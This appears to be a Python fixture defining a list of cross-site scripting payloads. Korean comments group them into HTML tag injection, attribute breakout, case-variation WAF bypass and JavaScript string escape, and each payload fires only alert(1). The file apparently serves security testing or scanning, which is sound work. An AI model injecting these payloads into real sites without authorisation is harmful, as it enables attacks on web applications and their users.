XSS_PAYLOADS: list[str] = [
    # HTML 컨텍스트 — 태그 직접 삽입
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",

    # 속성값 탈출 (attribute breakout)
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '" onmouseover="alert(1)" x="',
    "' onmouseover='alert(1)' x='",
    '" onfocus="alert(1)" autofocus="',

    # 대소문자 우회 (WAF bypass)
    "<ScRiPt>alert(1)</ScRiPt>",
    "<IMG SRC=x ONERROR=alert(1)>",

    # JS 컨텍스트 탈출
    "';alert(1)//",
    '";alert(1)//',
]
